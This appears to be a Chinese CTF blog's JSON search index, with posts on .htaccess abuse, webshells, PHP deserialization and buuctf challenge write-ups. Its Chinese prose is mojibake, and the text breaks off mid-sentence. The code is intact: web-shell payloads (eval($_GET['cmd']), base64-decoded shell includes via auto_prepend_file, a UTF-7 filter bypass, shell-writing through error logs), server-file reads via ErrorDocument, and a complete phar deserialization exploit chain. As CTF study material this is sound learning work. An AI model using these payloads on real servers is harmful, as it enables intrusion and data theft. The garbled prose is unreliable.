ç­›é€‰æ–¹æ³•ï¼š1.???[^x]??ç­›é€‰å‡ºç¬¬å››ä¸ªå­—ç¬¦ä¸æ˜¯xçš„é¡¹2.???[@-[]??ç­›é€‰å‡ºç¬¬å››ä¸ªå­—ç¬¦æ—¶å¤§å†™å­—æ¯çš„é¡¹ï¼ˆè¿™é‡Œåˆ©ç”¨äº†asccç çš„ä¸€ä¸ªèŒƒå›´ï¼‰ å‚è€ƒ:https://www.php.net/manual/zh/migration70.incompatible.php","link":"/2021/06/08/%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/"},{"title":"htaccessæ–‡ä»¶è¯¦è§£","text":"å‰è¨€æ„Ÿè§‰ä»¥å‰å­¦çš„ç¡®å®æ˜¯ä¸å¤Ÿç²¾ï¼ŒåŸæ¥htaccessæ–‡ä»¶ä¸æ­¢æ˜¯å¯ä»¥å°†å…¶ä»–æ–‡ä»¶ä»¥phpçš„æ–¹å¼è§£æ ç®€ä»‹htaccessæä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³• å¯å®ç°åŠŸèƒ½æ–‡ä»¶å¤¹å¯†ç ä¿æŠ¤ã€ç”¨æˆ·è‡ªåŠ¨é‡å®šå‘ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€æ”¹å˜ä½ çš„æ–‡ä»¶æ‰©å±•åã€å°ç¦ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€åªå…è®¸ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ï¼Œä»¥åŠä½¿ç”¨å…¶ä»–æ–‡ä»¶ä½œä¸ºindexæ–‡ä»¶ç­‰ä¸€äº›åŠŸèƒ½ æŒ‡ä»¤ä½œç”¨èŒƒå›´.htaccessæ–‡ä»¶ä¸­çš„é…ç½®æŒ‡ä»¤ä½œç”¨äº.htaccessæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ï¼Œä½†æ˜¯å¾ˆé‡è¦çš„ã€éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå…¶ä¸Šçº§ç›®å½•ä¹Ÿå¯èƒ½ä¼šæœ‰.htaccessæ–‡ä»¶ï¼Œè€ŒæŒ‡ä»¤æ˜¯æŒ‰æŸ¥æ‰¾é¡ºåºä¾æ¬¡ç”Ÿæ•ˆçš„ï¼Œæ‰€ä»¥ä¸€ä¸ªç‰¹å®šç›®å½•ä¸‹çš„.htaccessæ–‡ä»¶ä¸­çš„æŒ‡ä»¤å¯èƒ½ä¼šè¦†ç›–å…¶ä¸Šçº§ç›®å½•ä¸­çš„.htaccessæ–‡ä»¶ä¸­çš„æŒ‡ä»¤ï¼Œå³å­ç›®å½•ä¸­çš„æŒ‡ä»¤ä¼šè¦†ç›–çˆ¶ç›®å½•æˆ–è€…ä¸»é…ç½®æ–‡ä»¶ä¸­çš„æŒ‡ä»¤ã€‚ ä¸€äº›ä»£ç æ•´åˆè®©æŸäº›æ–‡ä»¶ä»¥phpçš„æ–¹å¼è§£æAddType application/x-httpd-php .pngå°†pngè§£æä¸ºphp &lt;FilesMatch &quot;1&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;åŒ…å«1çš„æ–‡ä»¶å‡è§£æä¸ºphp åœ¨æ‰€æœ‰é¡µé¢åŒ…å«(require)æŸä¸ªæ–‡ä»¶auto_prepend_fileä¸auto_append_fileä½¿ç”¨æ–¹æ³• php.iniä¸­æœ‰ä¸¤é¡¹ auto_prepend_file åœ¨é¡µé¢é¡¶éƒ¨åŠ è½½æ–‡ä»¶ auto_append_file åœ¨é¡µé¢åº•éƒ¨åŠ è½½æ–‡ä»¶ ä½¿ç”¨è¿™ç§æ–¹æ³•å¯ä»¥ä¸éœ€è¦æ”¹åŠ¨ä»»ä½•é¡µé¢ï¼Œå½“éœ€è¦ä¿®æ”¹é¡¶éƒ¨æˆ–åº•éƒ¨requireæ–‡ä»¶æ—¶ï¼Œåªéœ€è¦ä¿®æ”¹auto_prepend_fileä¸auto_append_fileçš„å€¼å³å¯ã€‚ æ€è·¯æ‹“å±•ï¼šæˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸ªåŸç†ï¼Œä»–æ˜¯æ–‡ä»¶åŒ…å«çš„æ€æƒ³åœ¨æŸä¸ªé¡µé¢åŠ è½½æ–‡ä»¶ï¼Œå½“æˆ‘ä»¬æƒ³åˆ°æ–‡ä»¶åŒ…å«çš„æ—¶å€™è‡ªç„¶è€Œç„¶åœ°å°±ä¼šæƒ³åˆ°phpä¼ªåè®®ï¼Œè¿™å°±æ˜¯è¿™ä¸ªåŠŸèƒ½çš„å‰å®³æ‰€åœ¨å¦‚æœæœ‰ä¸€é“é¢˜ç›®ï¼Œä»–è¿‡æ»¤äº†phpçš„æ‰€æœ‰æ ‡ç­¾ï¼Œä½†æ˜¯å…è®¸ä½ ä¸Šä¼ htaccessï¼Œè¿™ä¸ªæ—¶å€™çš„æ€è·¯å°±æ˜¯ï¼Œå°†å«æœ‰é©¬çš„æ–‡ä»¶base64åŠ å¯†ä¸Šä¼ ï¼Œç„¶åå†htaccessæ·»åŠ é…ç½®ï¼šphpä¼ªåè®®è§£ç æ‰“å¼€å½“ç„¶æ˜¾ç¤ºçš„é¡µé¢æœ¬èº«çš„ä»£ç ä¹Ÿè¦æ˜¯phpè¯­è¨€ ä»£ç php_value auto_prepend_file xxx.phpphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.wuwu&quot; ä½¿ä½œç”¨èŒƒå›´å†…çš„phpæ–‡ä»¶åœ¨æ–‡ä»¶å¤´/å°¾è‡ªåŠ¨includeæŒ‡å®šæ–‡ä»¶ï¼Œæ”¯æŒphpä¼ªåè®® php_value include_path &quot;xxx&quot; å¦‚æœå½“å‰ç›®å½•æ— æ³•å†™æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ”¹å˜åŒ…å«æ–‡ä»¶çš„è·¯å¾„ï¼Œå»åŒ…å«åˆ«çš„è·¯å¾„çš„æ–‡ä»¶ ç”¨é€”ï¼šæ–‡ä»¶åŒ…å«ï¼Œå¯ä»¥é…åˆAddType åˆ©ç”¨æŠ¥é”™ä¿¡æ¯å†™æ–‡ä»¶php_value error_reporting 32767php_value error_log /tmp/fl3g.php å¼€å¯æŠ¥é”™çš„åŒæ—¶å°†æŠ¥é”™ä¿¡æ¯å†™å…¥æ–‡ä»¶ ç”¨é€”ï¼šåˆ©ç”¨æŠ¥é”™å†™shell UTF-7ç¼–ç ç»•è¿‡å°–æ‹¬å·&lt;è¿‡æ»¤php_value zend.multibyte 1 # å¯ç”¨å¤šå­—èŠ‚ç¼–ç çš„æºæ–‡ä»¶è§£æphp_value zend.script_encoding &quot;UTF-7&quot; å°†ä»£ç çš„è§£ææ–¹å¼æ”¹æˆUTF-7 mb_convert_encoding('&lt;?php eval($_GET[\\'cmd\\']); ?&gt;',&quot;utf-7&quot;); payloadæ ·ä¾‹ï¼š +ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs prceç»•è¿‡æ­£åˆ™åŒ¹é…php_value pcre.backtrack_limit 0php_value pcre.jit 0 if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) è€Œä¸æ˜¯if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) !== 0)ï¼Œå› æ­¤å¯ä»¥é€šè¿‡php_value è®¾ç½®æ­£åˆ™å›æœ”æ¬¡æ•°æ¥ä½¿æ­£åˆ™åŒ¹é…çš„ç»“æœè¿”å›ä¸ºfalseè€Œä¸æ˜¯0æˆ–1ï¼Œé»˜è®¤çš„å›æœ”æ¬¡æ•°æ¯”è¾ƒå¤§ï¼Œå¯ä»¥è®¾æˆ0ï¼Œé‚£ä¹ˆå½“è¶…è¿‡æ­¤æ¬¡æ•°ä»¥åå°†è¿”å›false tricks.htaccessä¼¼ä¹å¯ä»¥åƒshellé‚£æ ·ä½¿ç”¨\\å°†ä¸¤è¡Œå†…å®¹è§£é‡Šä¸ºä¸€è¡Œ ç»•è¿‡è„å­—ç¬¦å¦‚æœ.htaccessæ–‡ä»¶ä¸­æœ‰ä¸ç¬¦åˆè¯­æ³•çš„å†…å®¹ï¼Œè®¿é—®æœåŠ¡å™¨ä¼šç›´æ¥æŠ¥500ï¼Œå¦‚æœé¢˜ç›®ä¸­ä¹±å†™.htaccessæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ¢è¡Œæ³¨é‡Šæ‰è„å­—ç¬¦ä¾‹å¦‚ï¼šé¢˜ç›®ä¸­æœ‰file_put_contents($filename, $content . &quot;\\nJust one chance&quot;)ï¼Œæˆ‘ä»¬payloadæœ€åå¯ä»¥åŠ ä¸Š#\\ï¼Œ#è´Ÿè´£æ³¨é‡Šï¼Œ\\å°†æ³¨é‡Šç¬¦å’Œè„å­—ç¬¦è¿æˆä¸€è¡Œï¼Œæ³¨é‡Šæ‰è„å­—ç¬¦ï¼Œæœ€åçš„æ–‡ä»¶ä¸º php_value include_path &quot;/tmp&quot;php_value zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot;# \\Just one chance ç»•è¿‡WAFå¦‚æœé¢˜ç›®è¿‡æ»¤äº†â€™fileâ€™ï¼Œå¯ä»¥è¿™ä¹ˆå†™.htaccess php_value auto_prepend_fi\\le &quot;.htaccess&quot;#&lt;?php eval($_GET[a]);?&gt;\\ .php. (2)ç»•è¿‡exif_imagetype()ä¸Šä¼ .htaccess #define width 20#define height 10 é‡‡ç”¨xbmæ ¼å¼X Bit Mapï¼Œç»•è¿‡exif_imagetype()æ–¹æ³•çš„æ£€æµ‹ï¼Œä¸Šä¼ æ–‡ä»¶æ¥è§£æã€‚åœ¨è®¡ç®—æœºå›¾å½¢å­¦ä¸­ï¼ŒX Windowç³»ç»Ÿä½¿ç”¨X BitMapï¼Œä¸€ç§çº¯æ–‡æœ¬äºŒè¿›åˆ¶å›¾åƒæ ¼å¼ï¼Œç”¨äºå­˜å‚¨X GUIä¸­ä½¿ç”¨çš„å…‰æ ‡å’Œå›¾æ ‡ä½å›¾ã€‚XBMæ•°æ®ç”±ä¸€ç³»åˆ—åŒ…å«å•è‰²åƒç´ æ•°æ®çš„é™æ€æ— ç¬¦å·å­—ç¬¦æ•°ç»„ç»„æˆï¼Œå½“æ ¼å¼è¢«æ™®éä½¿ç”¨æ—¶ï¼ŒXBMé€šå¸¸å‡ºç°åœ¨æ ‡é¢˜.hæ–‡ä»¶ä¸­ï¼Œæ¯ä¸ªå›¾åƒåœ¨æ ‡é¢˜ä¸­å­˜å‚¨ä¸€ä¸ªæ•°ç»„ã€‚ä¹Ÿå°±æ˜¯ç”¨cä»£ç æ¥æ ‡è¯†ä¸€ä¸ªxbmæ–‡ä»¶ï¼Œå‰ä¸¤ä¸ª#definesæŒ‡å®šä½å›¾çš„é«˜åº¦å’Œå®½åº¦ã€ä»¥åƒç´ ä¸ºå•ä½ï¼Œæ¯”å¦‚ä»¥ä¸‹xbmæ–‡ä»¶ï¼š#define test_width 16#define test_height 7 å‚è€ƒï¼šhttps://www.cnblogs.com/20175211lyz/p/11741348.html ErrorDocumentåˆ©ç”¨è¿™ä¸ªæ–‡æ¡£å¯ä»¥è¯»æ–‡ä»¶ https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-core.html#errordocument ErrorDocument 500 http://example.com/cgi-bin/server-error.cgiErrorDocument 404 /errors/bad_urls.phpErrorDocument 401 /subscription_info.htmlErrorDocument 403 &quot;Sorry, can't allow you access today&quot;ErrorDocument 403 Forbidden!ErrorDocument 403 /errors/forbidden.py?referrer=%{escape:%{HTTP_REFERER}} æ„æ€æ˜¯ï¼Œå½“å‡ºç°ä»¥ä¸Šé”™è¯¯æ—¶ï¼Œå°±ä¼šè¿”å›åé¢çš„å†…å®¹ï¼Œé‚£å°±æ„å‘³ç€å¯ä»¥ç›´æ¥è¯»äº† ErrorDocument 404 %{file:/etc/apache2/apache2.conf} https://www.cnblogs.com/ningmeng666/p/7644002.html ErrorLog ErrorLog ä¹Ÿèƒ½æ‰§è¡Œå‘½ä»¤ customlog globallog forensiclog transferlog éƒ½å…·æœ‰ pipe å½¢å¼ å‚è€ƒæ ¼å¼:https://www.docs4dev.com/docs/zh/apache/2.4/reference/logs.html#piped https://github.com/wireghoul/htshells","link":"/2021/06/11/htaccess%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"title":"PHPååºåˆ—åŒ–ç±»çš„åŸºç¡€çŸ¥è¯†å†å­¦ä¹ ","text":"å‰è¨€æ€»è§‰å¾—è‡ªå·±çš„åŸºç¡€çŸ¥è¯†ä¸æ˜¯å¾ˆæ‰å®ï¼Œå¯¼è‡´åœ¨åšé¢˜çš„è¿‡ç¨‹é€Ÿåº¦å¾ˆæ…¢ï¼Œä¹Ÿæ²¡æœ‰å®Œæ•´çš„æ•´ç†è¿‡ï¼Œæ‰€ä»¥è¿™é‡ŒæŠŠåŸºç¡€æ¦‚å¿µå†æ•´ç†ä¸€ä¸‹ ç±»æœ‰ä»€ä¹ˆç±»å¯ä»¥æœ‰å¸¸é‡ã€å±æ€§ï¼ˆä¹Ÿå°±æ˜¯å˜é‡ï¼‰ã€æ–¹æ³•ï¼ˆä¹Ÿå°±æ˜¯å‡½æ•°ï¼‰ ä»€ä¹ˆæ˜¯ç±»ç±»æ˜¯é¢å‘å¯¹è±¡çš„åŸºæœ¬æ¦‚å¿µï¼Œå°±æ˜¯å¯¹ç°å®ä¸­æŸä¸€ç§ç±»çš„äº‹ç‰©çš„æŠ½è±¡ æ¯”å¦‚æ‰‹æœºå¯ä»¥æŠ½è±¡ä¸ºä¸€ä¸ªç±»ï¼Œå…·ä½“å±æ€§æœ‰æ˜¾ç¤ºå±ç±»å‹ï¼Œæ˜¾ç¤ºå±å¸§ç‡ï¼Œå¤„ç†å™¨ï¼Œå†…å­˜è§„æ ¼ï¼Œç”µæ± å¤§å°ï¼Œå¿«å……åŠŸç‡ï¼Œæ‘„åƒå¤´è§„æ ¼ç­‰ã€‚ å¯ä»¥æœ‰è·å–æ‰‹æœºåç§°ï¼Œæ‰“ç”µè¯ï¼Œç©æ¸¸æˆï¼Œçœ‹è§†é¢‘ï¼ŒèŠå¤©ç­‰æ“ä½œæ–¹æ³•ã€‚ class phone{//å£°æ˜å±æ€§ $name='æ‰‹æœº'; function getPhoneName{ return $this-&gt;name; }} ä»€ä¹ˆæ˜¯å¯¹è±¡å¯¹è±¡æ˜¯å¼‚ç±»é£Ÿç‰©çš„ä¸€ä¸ªå…·ä½“äº‹ä¾‹ï¼šæ¯”å¦‚è¿™éƒ¨æ‰‹æœº å¯¹è±¡é€šè¿‡newå…³é”®å­—å®ä¾‹åŒ– $phone =new Phone();//å®ä¾‹åŒ–ä¸€ä¸ªæ‰‹æœºå¯¹è±¡$phone-&gt;name ='iphone';//ç»™æ‰‹æœºåç§°èµ‹å€¼echo $phone-&gt;getPhoneName();//è°ƒç”¨getPhoneNameçš„æ–¹æ³• å°ç»“ç±»æ˜¯æŠ½è±¡çš„æ¦‚å¿µï¼Œå¯¹è±¡æ˜¯å…·ä½“çš„å®ä¾‹ï¼Œç±»ä½¿ç¨‹åºå…·æœ‰é‡ç”¨æ€§ï¼Œå°±æ˜¯å¯ä»¥è¢«å…¶ä»–ç±»ç»§æ‰¿ ä»€ä¹ˆæ˜¯å±æ€§ç±»çš„å˜é‡æˆå‘˜å³ä¸ºå±æ€§ ä¼ªå˜é‡$this$this çš„å«ä¹‰æ˜¯è¡¨ç¤ºå®ä¾‹åŒ–åçš„å…·ä½“å¯¹è±¡ ä¸¾ä¸ªä¾‹å­: class phone{ public $name; public function getName(){ echo $this-&gt;name; }}$user=new phone;$user-&gt;name='iphone';$user-&gt;getname();//echo iphone; ä¸€ç‚¹ä½“ä¼šæˆ‘ä»¬çš„class æ˜¯ç±»ï¼Œæˆ‘ä»¬åé¢çš„$XXX=new xxx;æ˜¯å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡æ˜¯è¿™ä¸ªXXXï¼æˆ‘ä»¬å®ä¾‹åŒ–äº†è¿™ä¸ªå¯¹è±¡ï¼Œä»–å°±å…·æœ‰äº†ç±»çš„ç›¸å…³æ€§è´¨ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œè°ƒç”¨ã€‚","link":"/2021/06/15/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B1%BB%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%86%8D%E5%AD%A6%E4%B9%A0/"},{"title":"buuctf19","text":"[SWPUCTF 2018]SimplePHPä¸€å¼€å§‹å°±å…ˆçœ‹çœ‹æºç ä¹‹ç±»çš„ å‘ç°flagåœ¨flag.php ç„¶åæŸ¥çœ‹æ–‡ä»¶è¿™é‡Œæœ‰ä¸ª?file=ä»€ä¹ˆ æ„Ÿè§‰å¯ä»¥æ–‡ä»¶åŒ…å«,æˆåŠŸæ‹¿åˆ°æºç  &lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; //mkdir(&quot;upload&quot;,0777); if(file_exists(&quot;upload/&quot; . $filename)) { unlink($filename); } move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); echo '&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;'; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); $extension = end($temp); if(empty($extension)) { //echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo '&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;'; return false; } } } ?&gt; ç”¨äº†ç™½åå•è¿‡æ»¤ï¼Œæ‰€ä»¥æš‚æ—¶æ²¡æœ‰ä»€ä¹ˆå¥½çš„ç»•è¿‡æ–¹æ³•äºæ˜¯çœ‹çœ‹æ–‡ä»¶åŒ…å«èƒ½ä¸èƒ½ç»§ç»­èµ°ï¼Œå‘ç°ä¸€ä¸ªclass.php &lt;?phpclass C1e4r{ public $test; public $str; public function __construct($name) { #å°†strèµ‹å€¼ä¸ºname $this-&gt;str = $name; } public function __destruct() { $this-&gt;test = $this-&gt;str; echo $this-&gt;test; }}class Show{ public $source; public $str; public function __construct($file) { $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; } public function __toString() { $content = $this-&gt;str['str']-&gt;source; return $content; } public function __set($key,$value) { $this-&gt;$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) { die('hacker!'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) { echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; } }}class Test{ public $file; public $params; public function __construct() { $this-&gt;params = array(); } public function __get($key) { return $this-&gt;get($key); } public function get($key) { if(isset($this-&gt;params[$key])) { $value = $this-&gt;params[$key]; } else { $value = &quot;index.php&quot;; } return $this-&gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; }}?&gt; æ–‡ä»¶ä¸Šä¼ +åºåˆ—åŒ–â€”â€”&gt;pharååºåˆ—åŒ–ï¼Œæ‰€ä»¥æ­¤æ—¶æ€è·¯å°±æ¥äº†æ¥ä¸‹æ¥å¼€å§‹ç ”ç©¶ä¸€ä¸‹å¦‚ä½•ä¸Šä¼  è¿™æ˜¯æ€•æˆ‘ä»¬åšä¸å‡ºæ¥ è¿˜ç‰¹æ„ç»™äº†æç¤ºå§ï¼Œåˆ†æä¸€ä¸‹popé“¾å¦‚ä½•æ„é€ æœ€åå“Ÿä¸ªfile_get_contentsè¿™åº”è¯¥æ˜¯æˆ‘ä»¬çš„æœ€ç»ˆåˆ©ç”¨ç‚¹äº†ï¼Œä»åå¾€å‰æ¨ï¼Œæ˜¯valueè¢«æŸ¥ï¼Œæ‰€valueçš„èµ‹å€¼æ¥è‡ªgeté‡Œé¢çš„params[$key]ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦è®©keyçš„å€¼æ¥è‡ªgetçš„èµ‹å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨åˆ°getè¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œä½¿ç”¨æ¡ä»¶ä¸ºè¯»å–ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§æ—¶è·³è½¬ï¼Œå¾€å‰çœ‹ showçš„seté‡Œé¢æœ‰ä¸ªkeyï¼Œæƒ³è¦è·³è½¬åˆ°setçš„æ¡ä»¶æ˜¯ï¼Œå¯¹ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è¿›è¡Œå¤åˆ¶ï¼Œé‚£ä¹ˆvalueåˆè¦ä»å“ªé‡Œæ¥ï¼Ÿæ‰€ä»¥è¿™é‡Œå¥½åƒè¡Œä¸é€šï¼Œæˆ‘ä»¬æ¢ä¸ªæ€è·¯ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨getè¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œå°±è¦çœ‹çœ‹å“ªé‡Œèƒ½è°ƒç”¨ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è¿›è¡Œè·³è½¬ï¼Œè¿™ä¸ªæ—¶å€™å°±çœ‹åˆ°tostringé‡Œé¢çš„str[â€˜strâ€™]-&gt;sourceï¼Œæˆ‘ä»¬æ­¤æ—¶å°†str[â€˜strâ€™]èµ‹å€¼ä¸ºtestç±»ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨ä¸å­˜åœ¨çš„å±æ€§sourceï¼Œå°±ä¼šè·³è½¬åˆ°testçš„getä¸­äº†ï¼Œé‚£ä¹ˆtostringé‚£é‡Œä¼šè¢«è°ƒç”¨äº†ï¼Œé™¤äº†showé‡Œé¢çš„constructæˆ‘ä»¬è¦ç”¨æ¥å¯¹fileèµ‹å€¼ä»¥å¤–ï¼Œå°±æ˜¯cle4ré‡Œé¢çš„destructäº†æ¥ä¸‹æ¥æ­£å¼æ„é€ ä¸€æ³¢: æ„Ÿè§‰å¯¹äºè¿™é‡Œçš„æ€è·¯å¾ˆä¹±ï¼Œäºæ˜¯å°è¯•é‡æ–°ç†é¡ºä¸€ä¸‹æ€è·¯ï¼š popé“¾çš„æ„é€ é¦–å…ˆéœ€è¦æ‰¾åˆ°å¤´å’Œå°¾ï¼Œå¤´å°±æ˜¯ä¼ å…¥çš„åœ°æ–¹ï¼Œå°¾å°±æ˜¯æœ€ç»ˆæ‰§è¡Œçš„åœ°æ–¹ æœ¬é¢˜ä¸­çš„å°¾å·´å°±æ˜¯file_get_contentsï¼Œå¤´å°±æ˜¯æˆ‘ä»¬çš„phar ä»å°¾éƒ¨å€’é€€ï¼Œæˆ‘ä»¬è¦æ‰§è¡Œfile_get()å°±è¦æ‰§è¡Œget()ï¼Œé‚£ä¹ˆå°±éœ€è¦æ‰§è¡Œ__getï¼Œå³è°ƒç”¨ä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®çš„å±æ€§ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨å“ªé‡Œå¯ä»¥è°ƒç”¨ä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®çš„å±æ€§å‘¢ï¼Ÿ to_stringä¸­ä½¿ç”¨äº†str[â€˜strâ€™]è°ƒç”¨äº†sourceï¼Œè€Œsourceæ˜¯testä¸­æ²¡æœ‰çš„å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†str[â€˜strâ€™]èµ‹å€¼ä¸ºtest ä½†æ˜¯é—®é¢˜åˆæ¥äº†ï¼Œto_string å¦‚ä½•è°ƒç”¨å‘¢ï¼Ÿé‚£ä¹ˆå°±éœ€è¦æ‰¾åˆ°å°†ç±»è½¬åŒ–ä¸ºå­—ç¬¦ä¸²è¾“å‡ºçš„åœ°æ–¹ åœ¨__destructä¸­æœ‰ä¸ªecho $this-&gt;testè¿™é‡Œæˆ‘ä»¬å¦‚æœå°†testä¸ºshowç±»ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨showç±»é‡Œé¢çš„to_stringäº† æ•´ä½“çš„æ€è·¯å¦‚ä¸Š æ¥ä¸‹æ¥å°±å†™ä¸€ä¸‹å…·ä½“çš„æ„é€ é“¾æ¡: &lt;?phpclass C1e4r{ public $test; public $str;}class Show{ public $source; public $str;}class Test{ public $file; public $params;}$a=new C1e4r();$b=new Show();$c=new Test();$a-&gt;str=$b;$b-&gt;str['str']=$c;$c-&gt;params['source']='/var/www/html/f1ag.php';echo serialize($a);$phar = new Phar(&quot;exp.phar&quot;); //.pharæ–‡ä»¶$phar-&gt;startBuffering();$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;'); //å›ºå®šçš„$phar-&gt;setMetadata($a); //è§¦å‘çš„å¤´æ˜¯C1e4rç±»ï¼Œæ‰€ä»¥ä¼ å…¥C1e4rå¯¹è±¡$phar-&gt;addFromString(&quot;exp.gif&quot;, &quot;test&quot;); //éšä¾¿å†™ç‚¹ä»€ä¹ˆç”Ÿæˆä¸ªç­¾å$phar-&gt;stopBuffering();?&gt; O:5:&quot;C1e4r&quot;:2:{s:4:&quot;test&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Show&quot;:2:{s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;a:1:{s:3:&quot;str&quot;;O:4:&quot;Test&quot;:2:{s:4:&quot;file&quot;;N;s:6:&quot;params&quot;;a:1:{s:6:&quot;source&quot;;s:22:&quot;/var/www/html/f1ag.php&quot;;}}}}} ä»¥ä¸Šå³å¯æ„é€ æˆåŠŸï¼Œä½†æ˜¯è¿™é¢˜æ˜¯phar æˆ‘ä»¬è¿˜éœ€è¦åŠ ç‚¹å†…å®¹ æ¥ä¸‹æ¥å°±æ˜¯æ”¹ä¸€ä¸‹åç¼€è¯¶gifä¹‹ç±»çš„å›¾åƒåç¼€ï¼Œä¸Šä¼ æ–‡ä»¶ ç„¶åä½¿ç”¨phar:è§£æäº† å¦‚ä¸Šæ‰€ç¤ºï¼Œåœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°æ–‡ä»¶åï¼Œæ‰€ä»¥ file.php?file=phar://upload/67e9350f1ef6ad63c902075576c35210.jpg å°ç»“ï¼šæœ¬é¢˜æ˜¯å¸¸è§„çš„pharååºåˆ—åŒ–é¢˜ç›® [HarekazeCTF2019]encode_and_encode &lt;?phperror_reporting(0);if (isset($_GET['source'])) { show_source(__FILE__); exit();}function is_valid($str) { $banword = [ // no path traversal '\\.\\.', // no stream wrapper '(php|file|glob|data|tp|zip|zlib|phar):', // no data exfiltration 'flag' ]; $regexp = '/' . implode('|', $banword) . '/i'; if (preg_match($regexp, $str)) { return false; } return true;}$body = file_get_contents('php://input');#ä½¿ç”¨phpä¼ªåè®®æ¥å—æ•°æ®ï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥postå†…å®¹$json = json_decode($body, true);#å¯¹äºæˆ‘ä»¬postçš„å†…å®¹è¿›è¡Œè§£ç #æ£€æŸ¥æ˜¯å¦æœ‰é»‘åå•çš„å†…å®¹if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json['page'])) { $page = $json['page'];#è§£ç å‡ºæ¥ä»¥åéœ€è¦æœ‰pageæ ‡ç­¾ $content = file_get_contents($page); if (!$content || !is_valid($content)) { $content = &quot;&lt;p&gt;not found&lt;/p&gt;\\n&quot;; }} else { $content = '&lt;p&gt;invalid request&lt;/p&gt;';}// no data exfiltration!!!$content = preg_replace('/HarekazeCTF\\{.+\\}/i', 'HarekazeCTF{&amp;lt;censored&amp;gt;}', $content);echo json_encode(['content' =&gt; $content]); çœ‹åˆ°é¢˜ç›® åˆçœ‹åˆ°è¿‡æ»¤äº†é‚£ä¹ˆå¤šå†…å®¹ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„æ˜¯ä¼šä¸ä¼šæœ‰ä»€ä¹ˆå­—ç¬¦ä¸²è§£ææ¼æ´å…ˆåˆ†æä¸€ä¸‹æºç å§:å¥½äº†åˆ†æå®Œæ¯•ï¼Œå…¶å®æ€è·¯å¾ˆç®€å•ï¼Œå°±æ˜¯é€šè¿‡jsonçš„ä¸€äº›è§£ææ¼æ´æ„é€ ç‰¹æ®Šç¼–ç å½¢å¼ç»•è¿‡is_validæ£€æŸ¥ï¼Œè€Œä¸”å¾ˆå…³é”®çš„æ˜¯is_validé’ˆå¯¹çš„æ˜¯bodyçš„æ£€æŸ¥ï¼Œè€Œä¸æ˜¯è¢«è§£ç 